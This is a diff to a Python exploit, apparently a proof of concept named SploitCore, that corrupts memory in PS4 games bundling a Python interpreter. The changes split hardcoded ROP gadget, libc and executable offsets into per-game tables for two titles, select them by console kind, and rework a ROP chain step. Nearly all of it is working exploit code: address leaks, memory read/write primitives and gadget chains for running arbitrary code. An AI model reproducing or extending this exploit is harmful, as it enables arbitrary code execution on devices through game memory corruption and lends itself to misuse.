@@ -1,4 +1,5 @@
 import struct
+import os
 from types import CodeType, FunctionType
 
 """
@@ -16,46 +17,91 @@ What it does:
 
 # CHANGE ME
 GADGET_OFFSETS = {
-    # exec
-    "add rsp, 0x1b8; ret": 0xE7DC1,
-    "call rax": 0x51,
-    "jmp rax": 0x57D08,
-    "ret": 0x42,
-    "pop rax; ret": 0xC710E,
-    "pop rbx; ret": 0x339D5,
-    "pop rcx; ret": 0x1151A3,
-    "pop rdx; ret": 0x20B6FB,
-    "pop rsi; ret": 0x9884B,
-    "pop rdi; ret": 0xE2B93,
-    "pop rsp; ret": 0x1F8D,
-    "pop r8; ret": 0xC710D,
-    "pop r9; ret": 0x68A7DF,
-    "pop r12; ret": 0x2079BB,
-    "mov [rsi], rax; ret": 0x795C0A,
-    "mov rsp, rbp; pop rbp; ret": 0x56AA,
-    "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]": 0x3414C0,
-    "add [r8], r12; ret": 0x8F4F1,
-    # libc
-    "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x26FFE,
+    "A YEAR OF SPRINGS": {
+        "PS4": {
+            # exec
+            "add rsp, 0x1b8; ret": 0xE7DC1,
+            "pop rax; ret": 0xC710E,
+            "pop rcx; ret": 0x1151A3,
+            "pop rdx; ret": 0x20B6FB,
+            "pop rsi; ret": 0x9884B,
+            "pop r8; ret": 0xC710D,
+            "pop r9; ret": 0x68A7DF,
+            "mov [rsi], rax; ret": 0x795C0A,
+            "mov rsp, rbp; pop rbp; ret": 0x56AA,
+            "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]": 0x3414C0,
+            "add [r8 - 0x7d], rcx; ret": 0x752685,
+            # libc
+            "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x26FFE,
+        }
+    },
+    "Arcade Spirits: The New Challengers": {
+        "PS4": {
+            # exec
+            "add rsp, 0x1b8; ret": 0x856DF1,
+            "pop rax; ret": 0xA60CD,
+            "pop rcx; ret": 0xE6E03,
+            "pop rdx; ret": 0x9C762,
+            "pop rsi; ret": 0x153B1B,
+            "pop r8; ret": 0x25BADF,
+            "pop r9; ret": 0x6654CF,
+            "mov [rsi], rax; ret": 0x7D528A,
+            "mov rsp, rbp; pop rbp; ret": 0xC4,
+            "push rbp; mov rbp, rsp; xor esi, esi; call [rdi + 0x130]": 0x2D6410,
+            "add [r8 - 0x7d], rcx; ret": 0x72087E,
+            # libc
+            "mov rsp, [rdi + 0x38]; pop rdi; ret": 0x26FFE,
+        }
+    },
 }
 
 LIBC_OFFSETS = {
-    "sceKernelGetModuleInfoFromAddr": 0x113908,
-    "gettimeofday": 0x1139A0,
-    "strcmp": 0xB0AE0,
-    "__error": 0x168,
-    "strerror": 0x37000,
+    "A YEAR OF SPRINGS": {
+        "PS4": {
+            "sceKernelGetModuleInfoFromAddr": 0x113908,
+            "gettimeofday": 0x1139A0,
+            "strcmp": 0xB0AE0,
+            "__error": 0x168,
+            "strerror": 0x37000,
+        }
+    },
+    "Arcade Spirits: The New Challengers": {
+        "PS4": {
+            "sceKernelGetModuleInfoFromAddr": 0x113908,
+            "gettimeofday": 0x1139A0,
+            "strcmp": 0xB0AE0,
+            "__error": 0x168,
+            "strerror": 0x37000,
+        }
+    },
 }
 
 EXEC_OFFSETS = {
-    "function_call": 0x3B6E10,
-    "strcmp": 0xC5F608,
-    "sceSysmoduleLoadModule": 0x83AF30,
+    "A YEAR OF SPRINGS": {
+        "PS4": {
+            "func_repr": 0x3B6D70,
+            "strcmp": 0xC5F608,
+        }
+    },
+    "Arcade Spirits: The New Challengers": {
+        "PS4": {
+            "func_repr": 0x353CA0,
+            "strcmp": 0xC61F28,
+        }
+    },
 }
 
-DEBUG = False
+DEBUG = True
 PORT = 9025
 # END CHANGE ME
+
+CONSOLE_KIND = os.getenv("CONSOLE_KIND", None)
+if CONSOLE_KIND is None:
+    raise Exception("Cannot determine console kind")
+
+SELECTED_GADGETS = GADGET_OFFSETS.get(config.name, {}).get(CONSOLE_KIND, {})
+SELECTED_LIBC = LIBC_OFFSETS.get(config.name, {}).get(CONSOLE_KIND, {})
+SELECTED_EXEC = EXEC_OFFSETS.get(config.name, {}).get(CONSOLE_KIND, {})
 
 STAGE2_MAX_SIZE = 4 * 1024 * 1024  # 4MB
 STAGE2_BUF = bytes(b"\0" * STAGE2_MAX_SIZE)
@@ -412,19 +458,19 @@ class SploitCore(object):
 
         func_type_addr = addrof(FunctionType)
         debugprint("[*] FunctionType address: 0x%x" % func_type_addr)
-        func_call_addr = u64(
+        func_repr_addr = u64(
             self.mem[
-                func_type_addr - 0x1000 + 16 * 8 : func_type_addr - 0x1000 + 16 * 8 + 8
+                func_type_addr - 0x1000 + 11 * 8 : func_type_addr - 0x1000 + 11 * 8 + 8
             ]
         )
-        debugprint("[*] FunctionType.tp_call address: 0x%x" % func_call_addr)
+        debugprint("[*] FunctionType.tp_repr address: 0x%x" % func_repr_addr)
 
-        self.exec_base_addr = func_call_addr - EXEC_OFFSETS["function_call"]
+        self.exec_base_addr = func_repr_addr - SELECTED_EXEC["func_repr"]
         debugprint("[*] Executable base address: 0x%x" % self.exec_base_addr)
         self.modules = {}
 
         # Use hardcoded gadgets
-        self.gadgets = GADGET_OFFSETS
+        self.gadgets = SELECTED_GADGETS
 
         self.call_stack = None
         self.call_contextbuf = None
@@ -436,7 +482,7 @@ class SploitCore(object):
 
     @property
     def errno(self):
-        errno_addr = self.libc_addr + LIBC_OFFSETS["__error"]
+        errno_addr = self.libc_addr + SELECTED_LIBC["__error"]
         errno_ptr = self.run_function(errno_addr)
         errno = readuint(errno_ptr, 8)
         return errno
@@ -473,13 +519,13 @@ class SploitCore(object):
         SEGMENTS_OFFSET = 0x160
 
         self.libc_addr = (
-            readuint(self.exec_base_addr + EXEC_OFFSETS["strcmp"], 8)
-            - LIBC_OFFSETS["strcmp"]
+            readuint(self.exec_base_addr + SELECTED_EXEC["strcmp"], 8)
+            - SELECTED_LIBC["strcmp"]
         )
         debugprint("[*] libc base address: 0x%x" % self.libc_addr)
 
         gettimeofday_in_libkernel = readuint(
-            self.libc_addr + LIBC_OFFSETS["gettimeofday"], 8
+            self.libc_addr + SELECTED_LIBC["gettimeofday"], 8
         )
         debugprint("[*] gettimeofday address: 0x%x" % gettimeofday_in_libkernel)
 
@@ -487,7 +533,7 @@ class SploitCore(object):
         nogc.append(mod_info)
 
         sceKernelGetModuleInfoFromAddr_addr = readuint(
-            self.libc_addr + LIBC_OFFSETS["sceKernelGetModuleInfoFromAddr"], 8
+            self.libc_addr + SELECTED_LIBC["sceKernelGetModuleInfoFromAddr"], 8
         )
         debugprint(
             "[*] sceKernelGetModuleInfoFromAddr address: 0x%x"
@@ -643,10 +689,10 @@ class SploitCore(object):
                     ],
                     [
                         self.exec_base_addr + self.gadgets["pop r8; ret"],
-                        addrof(None),
-                        self.exec_base_addr + self.gadgets["pop r12; ret"],
+                        addrof(None) + 0x7D,
+                        self.exec_base_addr + self.gadgets["pop rcx; ret"],
                         1,
-                        self.exec_base_addr + self.gadgets["add [r8], r12; ret"],
+                        self.exec_base_addr + self.gadgets["add [r8 - 0x7d], rcx; ret"],
                         self.exec_base_addr + self.gadgets["pop rax; ret"],
                         addrof(None),
                         self.exec_base_addr
@@ -679,7 +725,7 @@ class SploitCore(object):
     def get_error_string(
         self,
     ):
-        strerror_addr = self.libc_addr + LIBC_OFFSETS["strerror"]
+        strerror_addr = self.libc_addr + SELECTED_LIBC["strerror"]
 
         errstr_addr = self.run_function(
             strerror_addr,
@@ -882,6 +928,11 @@ def create_tcp_socket(sc):
 
 
 def poc():
+    debugprint(
+        "[*] Detected console kind: %s, game name: %s" % (CONSOLE_KIND, config.name)
+    )
+    if not SELECTED_GADGETS or not SELECTED_LIBC or not SELECTED_EXEC:
+        raise Exception("Unsupported game / console kind combination")
     debugprint("[*] Will exploit the game")
     sc = SploitCore()
 
